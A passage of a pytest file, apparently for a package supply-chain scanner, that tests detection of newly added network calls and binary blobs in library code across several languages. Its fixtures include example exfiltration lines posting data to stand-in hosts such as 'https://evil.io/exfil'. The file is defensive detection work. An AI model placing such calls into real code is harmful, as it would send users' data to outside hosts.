    new = _write_files(tmp_path / "new", {
        "lib/helper.rb": "def greet; 'hello'; end\n",
        "lib/reporter.rb": "require 'net/http'\nNet::HTTP.post(URI('https://evil.io'), data)\n",
    })
    _, _, _, _, net_calls, _ = _build_diff(old, new)
    assert net_calls is True


def test_net_calls_detected_in_changed_python_file(tmp_path):
    """A .py file gaining a requests.post call sets network_calls_in_lib."""
    old = _write_files(tmp_path / "old", {"mylib/utils.py": "def compute(x):\n    return x * 2\n"})
    new = _write_files(tmp_path / "new", {
        "mylib/utils.py": (
            "import requests\n"
            "def compute(x):\n"
            "    requests.post('https://telemetry.example.com', json={'v': x})\n"
            "    return x * 2\n"
        ),
    })
    _, _, _, _, net_calls, _ = _build_diff(old, new)
    assert net_calls is True


def test_net_calls_not_flagged_in_install_hook(tmp_path):
    """Net::HTTP in extconf.rb (an install hook) is already a separate signal — not double-counted."""
    old = _write_files(tmp_path / "old", {})
    new = _write_files(tmp_path / "new", {
        "ext/myext/extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n",
    })
    _, install_added, _, _, net_calls, _ = _build_diff(old, new)
    assert install_added is True
    assert net_calls is False  # not double-counted


def test_net_calls_not_flagged_for_unchanged_code(tmp_path):
    """Pre-existing networking code that doesn't change does not set the flag."""
    code = "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n"
    old = _write_files(tmp_path / "old", {"lib/client.rb": code})
    new = _write_files(tmp_path / "new", {"lib/client.rb": code})
    _, _, _, _, net_calls, _ = _build_diff(old, new)
    assert net_calls is False


def test_net_calls_not_flagged_for_comment_lines(tmp_path):
    """Comment lines mentioning Net::HTTP should not trigger the flag."""
    old = _write_files(tmp_path / "old", {"lib/util.rb": "x = 1\n"})
    new = _write_files(tmp_path / "new", {
        "lib/util.rb": "x = 1\n# Net::HTTP example: Net::HTTP.get(...)\n",
    })
    _, _, _, _, net_calls, _ = _build_diff(old, new)
    assert net_calls is False


def test_added_lines_have_net_calls_ruby():
    assert _added_lines_have_net_calls(["Net::HTTP.post(uri, data)"], ".rb") is True
    assert _added_lines_have_net_calls(["Faraday.new(url: 'https://example.com')"], ".rb") is True
    assert _added_lines_have_net_calls(["def calculate(x); x * 2; end"], ".rb") is False


def test_added_lines_have_net_calls_python():
    assert _added_lines_have_net_calls(["requests.post('https://evil.io', json=data)"], ".py") is True
    assert _added_lines_have_net_calls(["httpx.get('https://api.example.com')"], ".py") is True
    assert _added_lines_have_net_calls(["result = compute(x)"], ".py") is False


def test_added_lines_have_net_calls_javascript():
    assert _added_lines_have_net_calls(["fetch('https://evil.io/exfil', {method: 'POST', body: data})"], ".js") is True
    assert _added_lines_have_net_calls(["axios.post('https://example.com', payload)"], ".js") is True
    assert _added_lines_have_net_calls(["const result = compute(x);"], ".js") is False


def test_added_lines_have_net_calls_php():
    assert _added_lines_have_net_calls(["$ch = curl_init('https://evil.io');"], ".php") is True
    assert _added_lines_have_net_calls(["$result = calculate($x);"], ".php") is False


def test_added_lines_have_net_calls_unknown_ext():
    # Unknown extension — no patterns to match, should not fire
    assert _added_lines_have_net_calls(["Net::HTTP.get(uri)"], ".xyz") is False


def test_diff_added_lines_extracts_only_additions():
    old = "line1\nline2\n"
    new = "line1\nline2\nnew_line\n"
    added = _diff_added_lines(old, new)
    assert added == ["new_line"]


def test_classifier_flags_network_calls_in_lib():
    from activities.classifier import _rule_based
    signals = PackageSignals(
        ecosystem="rubygems",
        package_name="my-gem",
        old_version="1.0.0",
        new_version="1.1.0",
        age=ReleaseAgeSignals(release_age_hours=500.0),
        diff=DiffSignals(
            diff_summary="lib/reporter.rb changed",
            diff_size_bytes=200,
            network_calls_in_lib=True,
        ),
    )
    verdict = _rule_based(signals)
    assert verdict.classification == "yellow"
    assert any("network calls" in f for f in verdict.flags)


# ---------------------------------------------------------------------------
# binary_data_added — binary content in non-binary-extension files
# ---------------------------------------------------------------------------

def test_binary_data_flagged_for_txt_with_null_bytes(tmp_path):
    """A new .txt file containing null bytes (binary) sets binary_data_added."""
    _old = _write_files(tmp_path / "old", {})
    new_dir = tmp_path / "new"
    new_dir.mkdir()
    (new_dir / "lib").mkdir()
    (new_dir / "lib" / "result.txt").write_bytes(b"scraped data\x00\x01\x02binary content here")
    new = _get_file_map(str(new_dir))
    old_map: dict = {}
    _, _, _, _, _, binary_added = _build_diff(old_map, new)
    assert binary_added is True


def test_binary_data_flagged_for_rb_with_binary_content(tmp_path):
    """A new .rb file with >10% non-text bytes sets binary_data_added."""
    _old = _write_files(tmp_path / "old", {})
    new_dir = tmp_path / "new"
    new_dir.mkdir()
    # Craft binary content: mostly binary bytes
    binary_payload = bytes(range(256)) * 40  # all byte values repeated
    new_dir_lib = new_dir / "lib"
    new_dir_lib.mkdir()
    (new_dir_lib / "payload.rb").write_bytes(binary_payload)
    new = _get_file_map(str(new_dir))
    _, _, _, _, _, binary_added = _build_diff({}, new)
    assert binary_added is True


def test_binary_data_not_flagged_for_known_binary_extensions(tmp_path):
    """PNG/JPG files are expected to be binary — not flagged."""
    _old = _write_files(tmp_path / "old", {})
    new_dir = tmp_path / "new"
    new_dir.mkdir()
    (new_dir / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00binary data here" + bytes(range(100)))
    new = _get_file_map(str(new_dir))
    _, _, _, _, _, binary_added = _build_diff({}, new)
    assert binary_added is False


def test_binary_data_not_flagged_for_clean_text_files(tmp_path):
    """A normal text .txt file does not set binary_data_added."""
    _old = _write_files(tmp_path / "old", {})
    new = _write_files(tmp_path / "new", {"lib/result.txt": "This is normal text content.\n"})
    _, _, _, _, _, binary_added = _build_diff({}, new)
    assert binary_added is False


def test_has_binary_content_null_bytes(tmp_path):
    f = tmp_path / "file.txt"
    f.write_bytes(b"hello\x00world")
    assert _has_binary_content(f) is True


def test_has_binary_content_clean_text(tmp_path):
    f = tmp_path / "file.txt"
    f.write_text("This is normal ASCII text content.\n")
    assert _has_binary_content(f) is False


def test_has_binary_content_high_non_ascii(tmp_path):
    f = tmp_path / "file.rb"
    # 50% non-printable bytes — clearly binary
    f.write_bytes(bytes([0x01, 0x02, 0x03, 0x04] * 100) + b"normal" * 10)
    assert _has_binary_content(f) is True


def test_classifier_flags_binary_data_added():
    from activities.classifier import _rule_based
    signals = PackageSignals(
        ecosystem="rubygems",
        package_name="my-gem",
        old_version="1.0.0",
        new_version="1.1.0",
        age=ReleaseAgeSignals(release_age_hours=500.0),
        diff=DiffSignals(
            diff_summary="lib/result.txt added",
            diff_size_bytes=200,
            binary_data_added=True,
        ),
    )
    verdict = _rule_based(signals)
    assert verdict.classification == "yellow"
    assert any("binary" in f for f in verdict.flags)
